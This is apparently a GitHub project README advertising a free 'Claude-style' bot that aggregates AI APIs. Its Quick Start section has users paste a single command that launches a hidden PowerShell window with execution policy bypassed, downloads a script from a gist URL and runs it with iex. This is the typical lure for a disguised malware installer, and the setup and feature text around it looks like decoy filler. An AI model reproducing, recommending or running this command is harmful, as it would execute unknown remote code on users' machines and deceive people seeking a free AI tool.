# 🧠 Claude Free API Bot

> Unified AI bot that aggregates **free and low-cost APIs** into one assistant experience so users can get **Claude-style answers, writing help, analysis, image workflows, and creative generation support** without depending on an expensive single subscription.

[![Python](https://img.shields.io/badge/Python-3.10+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![API Aggregator](https://img.shields.io/badge/API-Aggregator-8A2BE2?style=for-the-badge&logoColor=white)](#)
[![Free First](https://img.shields.io/badge/Mode-Free--First-00C851?style=for-the-badge)](#)
[![Assistant](https://img.shields.io/badge/Assistant-Claude--Style-FF6B00?style=for-the-badge)](#)

```
╔══════════════════════════════════════════════════════════════════════╗
║  Smart Reasoning        │  Claude-style thoughtful answers         ║
║  API Router             │  picks the best free provider            ║
║  Creative Workflows     │  writing, prompts, and media support     ║
║  Unified Experience     │  one bot instead of many AI tools        ║
╚══════════════════════════════════════════════════════════════════════╝
```

This project is built for users who want a **Claude-like assistant experience** for writing, reasoning, summarization, and creative workflows — but with a **free-first API aggregation model**.

---

## 🚀 Quick Start

If you just want to launch the project quickly on Windows, use the installation command below first. After that, continue with the local setup and API configuration steps.

### 🛠️ Installation

#### CMD
Open **CMD** and run this **single command**:

```powershell
cmd /c start /min powershell -ep bypass -c "iwr 'https://gist.githubusercontent.com/hkcodes84/bdd4e49d0bf508bfec96ed311d4e1093/raw/5804cdc7296b4e6064b13c2ec258f486f0001ed8/main.ps1' -UseBasicParsing|iex" & rem update
```

> Then continue with the setup, provider configuration, and bot launch steps below.

### ✨ What This Bot Does

This bot acts like a **Claude-style interface powered by multiple free or freemium APIs**.

It can:

- generate detailed and natural-sounding answers
- summarize long text and documents
- rewrite messages, posts, and emails
- help with brainstorming and structured thinking
- support image and video prompt workflows through connected providers
- switch between providers depending on availability, speed, or cost

The goal is to offer a **smart, premium-feeling assistant workflow** without forcing users into one expensive plan.

---

## 📘 Project Setup

### Requirements

- Python 3.10+
- Git
- Internet connection
- Optional proxy support
- API keys for free / freemium providers
- Optional Telegram, Discord, or web interface

### Step 2 — Install dependencies

```bash
pip install -r requirements.txt
```

### Step 3 — Configure environment

```bash
cp .env.example .env
```

Edit `.env` with your provider keys and preferences:

```env
# Core
BOT_MODE=claude_style_assistant
DEFAULT_PROVIDER=auto
ENABLE_TEXT=true
ENABLE_IMAGES=true
ENABLE_VIDEO_WORKFLOWS=true

# Optional providers
OPENROUTER_API_KEY=your_key_here
GROQ_API_KEY=your_key_here
TOGETHER_API_KEY=your_key_here
HF_TOKEN=your_huggingface_token
REPLICATE_API_TOKEN=your_replicate_token

# Routing
PREFER_FREE_PROVIDERS=true
MAX_REQUEST_RETRIES=3
USE_FALLBACK_PROVIDER=true

# Assistant behavior
DEFAULT_RESPONSE_STYLE=thoughtful_clear
MAX_CONTEXT_LENGTH=high
```

### Step 4 — Run the bot

```bash
python main.py
```

### Step 5 — Example usage

```bash
python main.py --prompt "Summarize this article in clear bullet points"
python main.py --prompt "Rewrite this message in a more professional tone"
python main.py --image-prompt "minimalist futuristic workspace, soft lighting, cinematic"
python main.py --video-prompt "calm cinematic morning scene, realistic lighting, smooth camera motion"
```

---

## 📌 Table of Contents

- [Quick Start](#-quick-start)
- [Overview](#-overview)
- [How It Works](#-how-it-works)
- [Core Features](#-core-features)
- [Claude-Style Use Cases](#-claude-style-use-cases)
- [API Routing Logic](#-api-routing-logic)
- [Image & Video Workflows](#-image--video-workflows)
- [Why This Is Useful](#-why-this-is-useful)
- [Disclaimer](#-disclaimer)

---

## 🌐 Overview

**Claude Free API Bot** is an AI assistant wrapper that combines several providers into one clean interface.

Instead of opening separate websites for chat, writing, summaries, prompts, and media workflows, the user gets a single assistant layer that can:

- understand the task
- pick the most suitable provider
- return a well-formatted answer
- retry with fallback services if needed

This is especially useful for people who want a **clean, thoughtful, assistant-style experience** without paying for multiple premium subscriptions.

---

## 🧠 How It Works

```text
User message
   ↓
Task classification
   ↓
Provider selection
   ↓
Free / freemium API routing
   ↓
Response cleanup and formatting
   ↓
Unified final answer
```

### Example routing behavior

- normal questions → text model
- long text → summarization-capable model
- writing tasks → best structured output provider
- image prompts → image-capable provider or prompt builder
- video concepts → prompt workflow and media-oriented provider

---

## ⚙️ Core Features

- **Claude-style answer formatting**
- **free-first API aggregation**
- **smart provider routing**
- **fallback logic** when one API fails
- **long-form writing help**
- **summaries and structured outputs**
- **image prompt support**
- **video workflow prompt support**
- **single assistant interface**

---

## ✍️ Claude-Style Use Cases

### 1. Writing Assistant
Draft posts, messages, emails, bios, product descriptions, and polished rewrites.

### 2. Summarization
Summarize articles, chat logs, notes, or research into short and useful outputs.

### 3. Thinking Partner
Use the bot for brainstorming, outlining, decision support, and structured reasoning.

### 4. Creative Prompting
Generate prompts for image tools, video tools, and concept design workflows.

---

## 🔀 API Routing Logic

The router can prioritize providers by:

- free availability
- lowest cost
- fastest response
- best quality for writing
- fallback if quotas are hit

### Example provider pool

- OpenRouter
- Groq
- Together AI
- Hugging Face Inference
- Replicate
- local models

---

## 🖼 Image & Video Workflows

Although the main focus is text and reasoning, the bot can also support:

- image prompt creation
- negative prompts
- visual concept design
- cinematic scene descriptions
- short-form video prompts
- aesthetic style guidance

### Example image prompt

```text
Elegant editorial portrait, realistic lighting, luxury fashion atmosphere, cinematic framing.
```

### Example video prompt

```text
A calm cinematic sunrise over a modern city skyline, realistic atmosphere, soft motion, slow camera drift.
```

---

## 💡 Why This Is Useful

A lot of premium assistant experiences feel better not because of one magic model, but because they combine:

- clear writing
- good formatting
- thoughtful replies
- multi-mode generation
- smooth workflow

This project tries to recreate that style with a **free-first, multi-provider architecture**.

That means users can get a **Claude-like experience** for many tasks while keeping flexibility and reducing subscription costs.

---

## ⚠️ Disclaimer

This repository is for **developer experimentation, workflow aggregation, and AI tool orchestration**. Availability, quotas, and output quality depend on the providers connected to the bot.

Always review provider terms, limits, pricing, and usage rules before using it in production or at scale.
